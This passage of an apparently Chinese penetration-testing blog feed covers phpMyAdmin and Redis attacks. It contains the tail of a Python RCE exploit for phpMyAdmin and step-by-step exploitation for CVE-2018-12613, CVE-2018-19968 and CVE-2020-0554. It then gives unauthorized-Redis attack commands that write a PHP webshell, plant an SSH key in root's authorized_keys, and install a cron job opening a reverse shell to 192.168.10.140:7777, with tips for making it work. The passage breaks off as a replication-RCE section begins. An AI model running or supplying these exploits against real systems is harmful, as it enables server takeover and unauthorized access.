            &lt;span class=&#34;s2&#34;&gt;&amp;#34;pos&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;sql_query&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;sql_delimiter&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;show_query&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;fk_checks&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;SQL&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Go&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;ajax_request&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;ajax_page_request&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_to_pma&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/import.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utils&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;code&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/code&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
                    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;already exists&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ERROR: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                        &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# build exploit&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;exploit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;db&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;goto&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sql.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;find&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0/e&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\0&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;replaceWith&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;columnIndex&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;useRegex&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;on&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Go&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ajax_request&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;url_to_pma&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tbl_find_replace.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exploit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utils&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/a&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;result: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exploit failed!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Try to manually set exploit parameters like --table, --database and --token.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Remember that servers with PHP version greater than 5.4.6&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34; is not exploitable, because of warning about null byte in regexp&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cve-2018-12613&#34;&gt;CVE-2018-12613&lt;/h3&gt;
&lt;p&gt;后台文件包含&lt;/p&gt;
&lt;p&gt;phpMyAdmin : 4.8.0和4.8.1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 写session文件
select &#39;&amp;lt;?php phpinfo();exit;?&amp;gt;&#39;

http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/l ib/php/sessions/sess_*** 	// *** 为phpMyAdmin的COOKIE值


&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cve-2018-19968&#34;&gt;CVE-2018-19968&lt;/h3&gt;
&lt;p&gt;任意文件包含/RCE&lt;/p&gt;
&lt;p&gt;phpMyAdmin ：4.8.0-4.8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 创建数据库，并将PHP代码写入session文件
CREATE DATABASE foo;
CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT &#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;;

# 访问如下url，在foo数据库中生成phpMyAdmin的配置表
http://xxxx/chk_rel.php?fixall_pmadb=1&amp;amp;db=foo

# 在foo数据库中插入如下数据
INSERT INTO pma__column_infoSELECT ‘1’, ‘foo’, ‘bar’, ‘baz’, ‘plop’,
‘plop’, ‘plop’, ‘plop’,
‘../../../../../../../../tmp/sess_***’,‘plop’;  // ***为phpMyAdmin的COOKIE值;需要注意session文件的位置，不同环境会有差异

# 访问如下url，实现包含session文件
http://xxxx/tbl_replace.php?db=foo&amp;amp;table=bar&amp;amp;where_clause=1=1&amp;amp;fields_name[multi_edit][][]=baz&amp;amp;clause_is_unique=1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cve-2020-0554&#34;&gt;CVE-2020-0554&lt;/h3&gt;
&lt;p&gt;后台SQL注入&lt;/p&gt;
&lt;p&gt;phpMyAdmin 4&amp;lt; 4.9.4&lt;/p&gt;
&lt;p&gt;phpMyAdmin 5&amp;lt; 5.0.1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://xxxx/server_privileges.php?ajax_requests=true&amp;amp;validate_username=1&amp;amp;username=1%27or%201=1%20--+db=&amp;amp;token=c2064a8c5f437da931fa01de5aec6581&amp;amp;viewing_mode=server

# 执行完毕后仅知道这条语句的执行成功与否，失败的话会报错，因此后续可以利用报错注入
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Redis 未授权利用</title>
        <link>https://coollllllll.github.io/p/redis/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/redis/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Redis 未授权利用" /&gt;&lt;h1 id=&#34;redis未授权利用&#34;&gt;Redis未授权利用&lt;/h1&gt;
&lt;h2 id=&#34;redis常用命令&#34;&gt;Redis常用命令&lt;/h2&gt;
&lt;p&gt;服务端启动：redis-server xxx.conf&lt;/p&gt;
&lt;p&gt;本地连接：redis-cli&lt;/p&gt;
&lt;p&gt;远程连接：redis-cli -h host -p port -a password&lt;/p&gt;
&lt;h2 id=&#34;未授权利用方式&#34;&gt;未授权利用方式&lt;/h2&gt;
&lt;h3 id=&#34;写webshell&#34;&gt;写Webshell&lt;/h3&gt;
&lt;p&gt;前提条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;知道Web目录&lt;/li&gt;
&lt;li&gt;redis运行用户拥有该目录写权限&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;keys *
&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; webshell &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#34;&lt;/span&gt; 

config get *
config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dir /var/www/html    &lt;span class=&#34;c1&#34;&gt;# 设置文件写入目录&lt;/span&gt;
config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dbfilename 1.php   &lt;span class=&#34;c1&#34;&gt;# 设置写入文件名&lt;/span&gt;
save &lt;span class=&#34;c1&#34;&gt;# 保存&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;redis可以创建文件，但无法创建目录&lt;/p&gt;
&lt;p&gt;清理痕迹要删除key，同时还原config里的配置项&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 431; 
			flex-basis: 1034px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210728161846989.png&#34; data-size=&#34;681x158&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210728161846989.png&#34;
			width=&#34;681&#34;
			height=&#34;158&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210728161846989_hu6d3d5ed4d385519572f260d87dc190a0_20681_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210728161846989_hu6d3d5ed4d385519572f260d87dc190a0_20681_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;写ssh公钥&#34;&gt;写ssh公钥&lt;/h3&gt;
&lt;p&gt;目标靶机的基本配置&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;存在root用户或其他用户下.ssh目录(权限700) 和 authorized_keys文件(权限600)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前提条件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;已知目标主机用户&lt;/li&gt;
&lt;li&gt;拥有.ssh目录&lt;/li&gt;
&lt;li&gt;允许使用基于密钥认证方式登录&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;// 本机生成公私钥
ssh-keygen -t rsa
// 将本机公钥放入key.txt
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat id_rsa.pub&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;ehco -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; key.txt

// 执行redis命令，生成键值对
cat /root/.ssh/key.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; redis-cli -h ip -x &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; pub

config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dir /root/.ssh
config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dbfilename authorized_keys
save

// 利用私钥登录
ssh -i id_rsa root@ip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;写定时任务反弹shell&#34;&gt;写定时任务反弹shell&lt;/h3&gt;
&lt;p&gt;前提条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;redis用户拥有计划任务目录写权限&lt;/li&gt;
&lt;li&gt;目标开启cron服务&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 攻击机开启监听
nc -nvlp 7777

set shell &amp;quot;\n\n*/1 * * * * /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.10.140/7777 0&amp;gt;&amp;amp;1\n\n&amp;quot;
config set dir /var/spool/cron
config set dbfilename root
save
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ubuntu反弹shell会出现多处错误：&lt;/p&gt;
&lt;p&gt;1.提示缺少默认邮件服务器，实际是因为计划任务执行出错，想要通过邮件服务器发送错误信息&lt;/p&gt;
&lt;p&gt;2.本质的错误信息为:&lt;code&gt;sh: 1: Syntax error: Bad fd number&lt;/code&gt;，查询后发现cron中command的执行环境为/bin/sh，而/bin/sh指向的是dash(它更好，变成默认了)，反弹任务中用bash环境去执行，所以产生冲突报错。因此&lt;strong&gt;只需要将目标机器的/bin/sh指向bash就可&lt;/strong&gt;，或者&lt;strong&gt;避免在cron文件里去使用bash这个shell，另外去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件&lt;/strong&gt;，再&lt;strong&gt;或者写计划任务的反弹shell内容如下&lt;/strong&gt;：&lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/7777 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.redis写入root文件权限为644，而root文件权限必须为600，否则报不安全错误&lt;/p&gt;
&lt;p&gt;3.redis写入文件后会出现乱码，centos主机会忽略乱码执行命令，而ubuntu和debian无法忽视乱码，不可以执行命令，&lt;strong&gt;反弹失败()&lt;/strong&gt;。因此可尝试主从复制写纯净文件达到效果，当然有了可利用的主从就不一定执着于定时任务&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;主从复制rce&#34;&gt;主从复制RCE&lt;/h3&gt;
&lt;p&gt;随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和cron，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。&lt;/p&gt;
&lt;h4 id=&#34;redis主从复制&#34;&gt;Redis主从复制&lt;/h4&gt;
